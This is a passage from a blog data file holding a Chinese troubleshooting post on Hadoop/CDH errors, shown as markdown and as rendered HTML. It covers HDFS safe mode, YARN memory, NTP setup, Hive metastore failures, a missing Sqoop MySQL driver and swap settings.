hive崩溃\n\n报错：\n```\n[root@hs01 hive]# hive\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0\n2017-12-20 14:31:54,793 WARN  [main] mapreduce.TableMapReduceUtil: The hbase-prefix-tree module jar containing PrefixTreeCodec is not present.  Continuing without it.\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0\n\nLogging initialized using configuration in jar:file:/opt/cloudera/parcels/CDH-5.7.1-1.cdh5.7.1.p0.11/jars/hive-common-1.1.0-cdh5.7.1.jar!/hive-log4j.properties\nException in thread \"main\" java.lang.RuntimeException: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient\n\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:540)\n\tat org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:689)\n\tat org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:628)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.apache.hadoop.util.RunJar.run(RunJar.java:221)\n\tat org.apache.hadoop.util.RunJar.main(RunJar.java:136)\nCaused by: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient\n\tat org.apache.hadoop.hive.metastore.MetaStoreUtils.newInstance(MetaStoreUtils.java:1493)\n\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.<init>(RetryingMetaStoreClient.java:67)\n\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:82)\n\tat org.apache.hadoop.hive.ql.metadata.Hive.createMetaStoreClient(Hive.java:2935)\n\tat org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:2954)\n\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:513)\n\t... 8 more\n```\n解决办法\n\nCan you please follow below steps and share the result?.\n\n1. Find out the node which hosting hive metastore service, you can use ambari to figure out the ip/hostname for that node.\n\n2. ssh root login to that hive metastore node and execute below commands.\n\nbash# ps -aef|grep -i org.apache.hadoop.hive.metastore.HiveMetaStore\n\nbash# lsof -i:9083\n\n3. From some other node try connecting hivemetastore port using telnet.\n\nbash# telnet <hivemeta server> 9083\n\nIf 9083 port is not occupied and ps command doesn't show any metastore process then please try to restart the hivemestore service from ambari UI and perform same check again.\n\n- #### Hive 报错，元数据库找不到\n\n报错内容\n```\nQuery for candidates of org.apache.hadoop.hive.metastore.model.MPartitionColumnStatistics and subclasses resulted in no possible candidates\nRequired table missing : \"`CDS`\" in Catalog \"\" Schema \"\". DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable \"datanucleus.autoCreateTables\"\norg.datanucleus.store.rdbms.exceptions.MissingTableException: Required table missing : \"`CDS`\" in Catalog \"\" Schema \"\". DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable \"datanucleus.autoCreateTables\"\n\tat org.datanucleus.store.rdbms.table.AbstractTable.exists(AbstractTable.java:485)\n```\n先检查hive下是否有mysql驱动程序\n\n解决办法\n\n1.Go to the $HIVE_HOME and run the initschema option on the schematool:\n\n    bin/schematool -dbType mysql -initSchema\n\n2.修改hive配置，允许自己建表建视图\n```\n<property>\n<name>datanucleus.autoCreateTables</name>\n<value>True</value>\n</property>\n```\n然后重启\n\n3.查看查看hive 用到的库，比如mysql中的hive库\n\n登录mysql\n\n     mysql -uroot -p******\n \n查看表\n ```\nuse hive;\nshow tables;\nselect * from [sometable]\n```\n表大致如下：\n```\n+---------------------------+\n| Tables_in_hive            |\n+---------------------------+\n| bucketing_cols            |\n| cds                       |\n| columns_v2                |\n| compaction_queue          |\n| completed_txn_components  |\n| database_params           |\n| db_privs                  |\n| dbs                       |\n| delegation_tokens         |\n| func_ru                   |\n| funcs                     |\n| global_privs              |\n| hive_locks                |\n| idxs                      |\n| index_params              |\n| master_keys               |\n| next_compaction_queue_id  |\n| next_lock_id              |\n| next_txn_id               |\n| notification_log          |\n| notification_sequence     |\n| nucleus_tables            |\n| part_col_privs            |\n| part_col_stats            |\n| part_privs                |\n| partition_events          |\n| partition_key_vals        |\n| partition_keys            |\n| partition_params          |\n| partitions                |\n| role_map                  |\n| roles                     |\n| sd_params                 |\n| sds                       |\n| sequence_table            |\n| serde_params              |\n| serdes                    |\n| skewed_col_names          |\n| skewed_col_value_loc_map  |\n| skewed_string_list        |\n| skewed_string_list_values |\n| skewed_values             |\n| sort_cols                 |\n| tab_col_stats             |\n| table_params              |\n| tbl_col_privs             |\n| tbl_privs                 |\n| tbls                      |\n| txn_components            |\n| txns                      |\n| type_fields               |\n| types                     |\n| version                   |\n+---------------------------+\n```\n4.终极解决方案\n\n重新安装hive，元数据库改名为hive2或者其他什么名字\n\n- #### sqoop : 缺少驱动\n报错：\n```\nThe Network Adapter could not establish the connection\nNo columns to generate for ClassWriter\nCould not load db driver class: com.mysql.jdbc.Driver\n```\n解决办法\n```\nwget http://central.maven.org/maven2/mysql/mysql-connector-java/5.1.45/mysql-connector-java-5.1.45.jar\ncp mysql-connector-java-5.1.35-bin.jar /opt/cloudera/parcels/CDH-5.0.2-1.cdh5.0.2.p0.13/lib/sqoop/lib/\n```\n\n- #### CDH交换内存异常\n\n关闭系统交换区\n\n立即生效\n    \n    swapoff –a\n\n建议永久关闭\n\n    sysctl vm.swappiness=0","source":"_posts/Hadoop/报错处理.md","raw":"---\ntitle: 报错处理\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- #### Name node is in safe mode\n\n 这是因为在分布式文件系统启动的时候，开始的时候会有安全模式，当分布式文件系统处于安全模式的情况下，文件系统中的内容不允许修改也不允许删除，直到安全模式结束。安全模式主要是为了系统启动的时候检查各个DataNode上数据块的有效性，同时根据策略必要的复制或者删除部分数据块。运行期通过命令也可以进入安全模式。在实践过程中，系统启动的时候去修改和删除文件也会有安全模式不允许修改的出错提示，只需要等待一会儿即可。\n\n可以通过以下命令来手动离开安全模式：\n\n    hdfs dfsadmin -safemode leave  \n\n- #### 内存分配不合理\n\n表现\n```\n2017-12-14 18:32:32,336 ERROR [Thread-52] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Could not deallocate container for task attemptId attempt_1513247318192_0014_r_000008_0\n\n2017-12-14 19:20:22,161 ERROR [RMCommunicator Allocator] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Container complete event for unknown container id container_1513249512179_0014_01_000064\n```\n解决办法\n\n修改map，reduce内存和堆栈内存\n\n可能是因为设置大了，也可能是因为设置小了。要根据机器配置修改\n\n保证为map 和reduce分配内存的时候不会超过节点的内存\n```\nyarn.nodemanager.resource.memory-mb=2G\nyarn.scheduler.maximum-allocation-mb=4G\n```\n- #### 时钟不同步\n各种报错\n安装ntp\n```\n    yum install ntp\n```\n配置ntp\n```\nrestrict default ignore   //默认不允许修改或者查询ntp,并且不接收特殊封包\nrestrict 127.0.0.1        //给于本机所有权限\nrestrict 192.168.56.0 mask 255.255.255.0 notrap nomodify  //给于局域网机的机器有同步时间的权限\nserver  192.168.56.121     # local clock\ndriftfile /var/lib/ntp/drift\nfudge   127.127.1.0 stratum 10\n```\n启动 ntp：\n\n    service ntpd start\n设置开机启动:\n\n     chkconfig ntpd on\n\n- #### hdfs块丢失\n\n1、首先退出hdfs namenode safe mode\n```\n\n\n    hadoop dfsadmin -safemode leave\n```\n2、修复hdfs丢失的块\n\n```\nhadoop fsck /\n\nhdfs fsck  /  -delete //此方式会将丢失的块全部删除\n```\n\n- #### HDFS 块副本数不足\n> 块\n\n> 在HDFS中，文件是以块（block）的形式存储的，而HDFS的设计初衷也是用来处理大文件的，使用抽象块正好可以满足这一需求。具体来说，比如一个很大的文件，在单一的节点上存储是不可能的，HDFS使用逻辑块的方式将这个很大的文件分成很多块，分别存储在各个节点机器上，从而实现了大文件的存储。\n>     使用抽象块作为操作的单元，方便了存储系统的管理，具体来说，就是把文件块放在DataNode上存储，把文件的元数据信息放到NameNode上管理。\n>     最后，通过给块设置副本，可以实现容错机制。\n> \n1.设置副本数\n\ncdh界面选择hdfs,选择配置设置\n\n    dfs.replication=datanode的数量\n\n2.修改之前的副本数\n\n    hadoop fs -setrep -R 【1中设置的副本数】/\n\n- #### hive崩溃\n\n报错：\n```\n[root@hs01 hive]# hive\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0\n2017-12-20 14:31:54,793 WARN  [main] mapreduce.TableMapReduceUtil: The hbase-prefix-tree module jar containing PrefixTreeCodec is not present.  Continuing without it.\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0\n\nLogging initialized using configuration in jar:file:/opt/cloudera/parcels/CDH-5.7.1-1.cdh5.7.1.p0.11/jars/hive-common-1.1.0-cdh5.7.1.jar!/hive-log4j.properties\nException in thread \"main\" java.lang.RuntimeException: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient\n\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:540)\n\tat org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:689)\n\tat org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:628)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.apache.hadoop.util.RunJar.run(RunJar.java:221)\n\tat org.apache.hadoop.util.RunJar.main(RunJar.java:136)\nCaused by: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient\n\tat org.apache.hadoop.hive.metastore.MetaStoreUtils.newInstance(MetaStoreUtils.java:1493)\n\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.<init>(RetryingMetaStoreClient.java:67)\n\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:82)\n\tat org.apache.hadoop.hive.ql.metadata.Hive.createMetaStoreClient(Hive.java:2935)\n\tat org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:2954)\n\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:513)\n\t... 8 more\n```\n解决办法\n\nCan you please follow below steps and share the result?.\n\n1. Find out the node which hosting hive metastore service, you can use ambari to figure out the ip/hostname for that node.\n\n2. ssh root login to that hive metastore node and execute below commands.\n\nbash# ps -aef|grep -i org.apache.hadoop.hive.metastore.HiveMetaStore\n\nbash# lsof -i:9083\n\n3. From some other node try connecting hivemetastore port using telnet.\n\nbash# telnet <hivemeta server> 9083\n\nIf 9083 port is not occupied and ps command doesn't show any metastore process then please try to restart the hivemestore service from ambari UI and perform same check again.\n\n- #### Hive 报错，元数据库找不到\n\n报错内容\n```\nQuery for candidates of org.apache.hadoop.hive.metastore.model.MPartitionColumnStatistics and subclasses resulted in no possible candidates\nRequired table missing : \"`CDS`\" in Catalog \"\" Schema \"\". DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable \"datanucleus.autoCreateTables\"\norg.datanucleus.store.rdbms.exceptions.MissingTableException: Required table missing : \"`CDS`\" in Catalog \"\" Schema \"\". DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable \"datanucleus.autoCreateTables\"\n\tat org.datanucleus.store.rdbms.table.AbstractTable.exists(AbstractTable.java:485)\n```\n先检查hive下是否有mysql驱动程序\n\n解决办法\n\n1.Go to the $HIVE_HOME and run the initschema option on the schematool:\n\n    bin/schematool -dbType mysql -initSchema\n\n2.修改hive配置，允许自己建表建视图\n```\n<property>\n<name>datanucleus.autoCreateTables</name>\n<value>True</value>\n</property>\n```\n然后重启\n\n3.查看查看hive 用到的库，比如mysql中的hive库\n\n登录mysql\n\n     mysql -uroot -p******\n \n查看表\n ```\nuse hive;\nshow tables;\nselect * from [sometable]\n```\n表大致如下：\n```\n+---------------------------+\n| Tables_in_hive            |\n+---------------------------+\n| bucketing_cols            |\n| cds                       |\n| columns_v2                |\n| compaction_queue          |\n| completed_txn_components  |\n| database_params           |\n| db_privs                  |\n| dbs                       |\n| delegation_tokens         |\n| func_ru                   |\n| funcs                     |\n| global_privs              |\n| hive_locks                |\n| idxs                      |\n| index_params              |\n| master_keys               |\n| next_compaction_queue_id  |\n| next_lock_id              |\n| next_txn_id               |\n| notification_log          |\n| notification_sequence     |\n| nucleus_tables            |\n| part_col_privs            |\n| part_col_stats            |\n| part_privs                |\n| partition_events          |\n| partition_key_vals        |\n| partition_keys            |\n| partition_params          |\n| partitions                |\n| role_map                  |\n| roles                     |\n| sd_params                 |\n| sds                       |\n| sequence_table            |\n| serde_params              |\n| serdes                    |\n| skewed_col_names          |\n| skewed_col_value_loc_map  |\n| skewed_string_list        |\n| skewed_string_list_values |\n| skewed_values             |\n| sort_cols                 |\n| tab_col_stats             |\n| table_params              |\n| tbl_col_privs             |\n| tbl_privs                 |\n| tbls                      |\n| txn_components            |\n| txns                      |\n| type_fields               |\n| types                     |\n| version                   |\n+---------------------------+\n```\n4.终极解决方案\n\n重新安装hive，元数据库改名为hive2或者其他什么名字\n\n- #### sqoop : 缺少驱动\n报错：\n```\nThe Network Adapter could not establish the connection\nNo columns to generate for ClassWriter\nCould not load db driver class: com.mysql.jdbc.Driver\n```\n解决办法\n```\nwget http://central.maven.org/maven2/mysql/mysql-connector-java/5.1.45/mysql-connector-java-5.1.45.jar\ncp mysql-connector-java-5.1.35-bin.jar /opt/cloudera/parcels/CDH-5.0.2-1.cdh5.0.2.p0.13/lib/sqoop/lib/\n```\n\n- #### CDH交换内存异常\n\n关闭系统交换区\n\n立即生效\n    \n    swapoff –a\n\n建议永久关闭\n\n    sysctl vm.swappiness=0","slug":"Hadoop/报错处理","published":1,"updated":"2018-07-10T13:10:09.886Z","_id":"cjjedmh9d002g0gtjckzkfl2h","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"Name-node-is-in-safe-mode\"><a href=\"#Name-node-is-in-safe-mode\" class=\"headerlink\" title=\"Name node is in safe mode\"></a>Name node is in safe mode</h4><p>这是因为在分布式文件系统启动的时候，开始的时候会有安全模式，当分布式文件系统处于安全模式的情况下，文件系统中的内容不允许修改也不允许删除，直到安全模式结束。安全模式主要是为了系统启动的时候检查各个DataNode上数据块的有效性，同时根据策略必要的复制或者删除部分数据块。运行期通过命令也可以进入安全模式。在实践过程中，系统启动的时候去修改和删除文件也会有安全模式不允许修改的出错提示，只需要等待一会儿即可。</p>\n</li>\n</ul>\n<p>可以通过以下命令来手动离开安全模式：</p>\n<pre><code>hdfs dfsadmin -safemode leave  \n</code></pre><ul>\n<li><h4 id=\"内存分配不合理\"><a href=\"#内存分配不合理\" class=\"headerlink\" title=\"内存分配不合理\"></a>内存分配不合理</h4></li>\n</ul>\n<p>表现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2017-12-14 18:32:32,336 ERROR [Thread-52] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Could not deallocate container for task attemptId attempt_1513247318192_0014_r_000008_0</span><br><span class=\"line\"></span><br><span class=\"line\">2017-12-14 19:20:22,161 ERROR [RMCommunicator Allocator] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Container complete event for unknown container id container_1513249512179_0014_01_000064</span><br></pre></td></tr></table></figure></p>\n<p>解决办法</p>\n<p>修改map，reduce内存和堆栈内存</p>\n<p>可能是因为设置大了，也可能是因为设置小了。要根据机器配置修改</p>\n<p>保证为map 和reduce分配内存的时候不会超过节点的内存<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn.nodemanager.resource.memory-mb=2G</span><br><span class=\"line\">yarn.scheduler.maximum-allocation-mb=4G</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"时钟不同步\"><a href=\"#时钟不同步\" class=\"headerlink\" title=\"时钟不同步\"></a>时钟不同步</h4>各种报错<br>安装ntp<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install ntp</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>配置ntp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">restrict default ignore   //默认不允许修改或者查询ntp,并且不接收特殊封包</span><br><span class=\"line\">restrict 127.0.0.1        //给于本机所有权限</span><br><span class=\"line\">restrict 192.168.56.0 mask 255.255.255.0 notrap nomodify  //给于局域网机的机器有同步时间的权限</span><br><span class=\"line\">server  192.168.56.121     # local clock</span><br><span class=\"line\">driftfile /var/lib/ntp/drift</span><br><span class=\"line\">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure></p>\n<p>启动 ntp：</p>\n<pre><code>service ntpd start\n</code></pre><p>设置开机启动:</p>\n<pre><code>chkconfig ntpd on\n</code></pre><ul>\n<li><h4 id=\"hdfs块丢失\"><a href=\"#hdfs块丢失\" class=\"headerlink\" title=\"hdfs块丢失\"></a>hdfs块丢失</h4></li>\n</ul>\n<p>1、首先退出hdfs namenode safe mode<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">hadoop dfsadmin -safemode leave</span><br></pre></td></tr></table></figure></p>\n<p>2、修复hdfs丢失的块</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop fsck /</span><br><span class=\"line\"></span><br><span class=\"line\">hdfs fsck  /  -delete //此方式会将丢失的块全部删除</span><br></pre></td></tr></table></figure>\n<ul>\n<li><h4 id=\"HDFS-块副本数不足\"><a href=\"#HDFS-块副本数不足\" class=\"headerlink\" title=\"HDFS 块副本数不足\"></a>HDFS 块副本数不足</h4><blockquote>\n<p>块</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>在HDFS中，文件是以块（block）的形式存储的，而HDFS的设计初衷也是用来处理大文件的，使用抽象块正好可以满足这一需求。具体来说，比如一个很大的文件，在单一的节点上存储是不可能的，HDFS使用逻辑块的方式将这个很大的文件分成很多块，分别存储在各个节点机器上，从而实现了大文件的存储。<br>    使用抽象块作为操作的单元，方便了存储系统的管理，具体来说，就是把文件块放在DataNode上存储，把文件的元数据信息放到NameNode上管理。<br>    最后，通过给块设置副本，可以实现容错机制。</p>\n</blockquote>\n<p>1.设置副本数</p>\n<p>cdh界面选择hdfs,选择配置设置</p>\n<pre><code>dfs.replication=datanode的数量\n</code></pre><p>2.修改之前的副本数</p>\n<pre><code>hadoop fs -setrep -R 【1中设置的副本数】/\n</code></pre><ul>\n<li><h4 id=\"hive崩溃\"><a href=\"#hive崩溃\" class=\"headerlink\" title=\"hive崩溃\"></a>hive崩溃</h4></li>\n</ul>\n<p>报错：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hs01 hive]# hive</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0</span><br><span class=\"line\">2017-12-20 14:31:54,793 WARN  [main] mapreduce.TableMapReduceUtil: The hbase-prefix-tree module jar containing PrefixTreeCodec is not present.  Continuing without it.</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0</span><br><span class=\"line\"></span><br><span class=\"line\">Logging initialized using configuration in jar:file:/opt/cloudera/parcels/CDH-5.7.1-1.cdh5.7.1.p0.11/jars/hive-common-1.1.0-cdh5.7.1.jar!/hive-log4j.properties</span><br><span class=\"line\">Exception in thread &quot;main&quot; java.lang.RuntimeException: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:540)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:689)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:628)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.apache.hadoop.util.RunJar.run(RunJar.java:221)</span><br><span class=\"line\">\tat org.apache.hadoop.util.RunJar.main(RunJar.java:136)</span><br><span class=\"line\">Caused by: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.MetaStoreUtils.newInstance(MetaStoreUtils.java:1493)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.&lt;init&gt;(RetryingMetaStoreClient.java:67)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:82)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.metadata.Hive.createMetaStoreClient(Hive.java:2935)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:2954)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:513)</span><br><span class=\"line\">\t... 8 more</span><br></pre></td></tr></table></figure></p>\n<p>解决办法</p>\n<p>Can you please follow below steps and share the result?.</p>\n<ol>\n<li><p>Find out the node which hosting hive metastore service, you can use ambari to figure out the ip/hostname for that node.</p>\n</li>\n<li><p>ssh root login to that hive metastore node and execute below commands.</p>\n</li>\n</ol>\n<p>bash# ps -aef|grep -i org.apache.hadoop.hive.metastore.HiveMetaStore</p>\n<p>bash# lsof -i:9083</p>\n<ol start=\"3\">\n<li>From some other node try connecting hivemetastore port using telnet.</li>\n</ol>\n<p>bash# telnet <hivemeta server=\"\"> 9083</hivemeta></p>\n<p>If 9083 port is not occupied and ps command doesn’t show any metastore process then please try to restart the hivemestore service from ambari UI and perform same check again.</p>\n<ul>\n<li><h4 id=\"Hive-报错，元数据库找不到\"><a href=\"#Hive-报错，元数据库找不到\" class=\"headerlink\" title=\"Hive 报错，元数据库找不到\"></a>Hive 报错，元数据库找不到</h4></li>\n</ul>\n<p>报错内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Query for candidates of org.apache.hadoop.hive.metastore.model.MPartitionColumnStatistics and subclasses resulted in no possible candidates</span><br><span class=\"line\">Required table missing : &quot;`CDS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.autoCreateTables&quot;</span><br><span class=\"line\">org.datanucleus.store.rdbms.exceptions.MissingTableException: Required table missing : &quot;`CDS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.autoCreateTables&quot;</span><br><span class=\"line\">\tat org.datanucleus.store.rdbms.table.AbstractTable.exists(AbstractTable.java:485)</span><br></pre></td></tr></table></figure></p>\n<p>先检查hive下是否有mysql驱动程序</p>\n<p>解决办法</p>\n<p>1.Go to the $HIVE_HOME and run the initschema option on the schematool:</p>\n<pre><code>bin/schematool -dbType mysql -initSchema\n</code></pre><p>2.修改hive配置，允许自己建表建视图<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">&lt;name&gt;datanucleus.autoCreateTables&lt;/name&gt;</span><br><span class=\"line\">&lt;value&gt;True&lt;/value&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>\n<p>然后重启</p>\n<p>3.查看查看hive 用到的库，比如mysql中的hive库</p>\n<p>登录mysql</p>\n<pre><code>mysql -uroot -p******\n</code></pre><p>查看表<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use hive;</span><br><span class=\"line\">show tables;</span><br><span class=\"line\">select * from [sometable]</span><br></pre></td></tr></table></figure></p>\n<p>表大致如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| Tables_in_hive            |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| bucketing_cols            |</span><br><span class=\"line\">| cds                       |</span><br><span class=\"line\">| columns_v2                |</span><br><span class=\"line\">| compaction_queue          |</span><br><span class=\"line\">| completed_txn_components  |</span><br><span class=\"line\">| database_params           |</span><br><span class=\"line\">| db_privs                  |</span><br><span class=\"line\">| dbs                       |</span><br><span class=\"line\">| delegation_tokens         |</span><br><span class=\"line\">| func_ru                   |</span><br><span class=\"line\">| funcs                     |</span><br><span class=\"line\">| global_privs              |</span><br><span class=\"line\">| hive_locks                |</span><br><span class=\"line\">| idxs                      |</span><br><span class=\"line\">| index_params              |</span><br><span class=\"line\">| master_keys               |</span><br><span class=\"line\">| next_compaction_queue_id  |</span><br><span class=\"line\">| next_lock_id              |</span><br><span class=\"line\">| next_txn_id               |</span><br><span class=\"line\">| notification_log          |</span><br><span class=\"line\">| notification_sequence     |</span><br><span class=\"line\">| nucleus_tables            |</span><br><span class=\"line\">| part_col_privs            |</span><br><span class=\"line\">| part_col_stats            |</span><br><span class=\"line\">| part_privs                |</span><br><span class=\"line\">| partition_events          |</span><br><span class=\"line\">| partition_key_vals        |</span><br><span class=\"line\">| partition_keys            |</span><br><span class=\"line\">| 